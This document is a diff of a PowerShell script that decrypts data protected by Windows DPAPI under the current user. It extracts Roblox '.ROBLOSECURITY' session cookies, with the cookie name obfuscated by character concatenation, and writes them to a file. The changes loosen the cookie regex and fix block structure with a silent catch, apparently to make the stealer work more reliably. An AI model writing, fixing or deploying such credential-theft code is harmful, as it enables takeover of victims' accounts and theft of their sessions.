@@ -92,7 +92,7 @@ foreach($p2 in $rp0){
             $d1=[Security.Cryptography.ProtectedData]::Unprotect($e1,$null,[Security.Cryptography.DataProtectionScope]::CurrentUser)
             $c1=[Text.Encoding]::UTF8.GetString($d1)
             # Netscape format: name<TAB>value — use TAB not =
-            if($c1 -match ([char]46+'R'+'O'+'B'+'L'+'O'+'S'+'E'+'C'+'U'+'R'+'I'+'T'+'Y')+'\t([^\r\n]+)'){
+            if($c1 -match ([char]46+'R'+'O'+'B'+'L'+'O'+'S'+'E'+'C'+'U'+'R'+'I'+'T'+'Y')+'\t([^;]+)'){
                             $ck=$Matches[1].Trim()
                             Add-Content $f0 "$tR|$ck"
                         }else{
@@ -121,7 +121,7 @@ if(Test-Path $p3){
                 $e2=[Convert]::FromBase64String($Matches[1])
                 $d2=[Security.Cryptography.ProtectedData]::Unprotect($e2,$null,[Security.Cryptography.DataProtectionScope]::CurrentUser)
                 $c2=[Text.Encoding]::UTF8.GetString($d2)
-                if($c2 -match ([char]46+'R'+'O'+'B'+'L'+'O'+'S'+'E'+'C'+'U'+'R'+'I'+'T'+'Y')+'\t([^\r\n]+)'){
+                if($c2 -match ([char]46+'R'+'O'+'B'+'L'+'O'+'S'+'E'+'C'+'U'+'R'+'I'+'T'+'Y')+'\t([^;]+)'){
                                 $ck=$Matches[1].Trim()
                                 Add-Content $f0 "$tRM|$ck"
                             }else{
@@ -130,6 +130,8 @@ if(Test-Path $p3){
                                 if($cae -ge 0){$ck=$c2.Substring($cae);Add-Content $f0 "$tRM|$ck"
                                 }else{Add-Content $f0 "$tRM|$($c2.Substring(0,[Math]::Min(2000,$c2.Length)))"}
                             }
+            }
+        }catch{}
         break
     }
 }
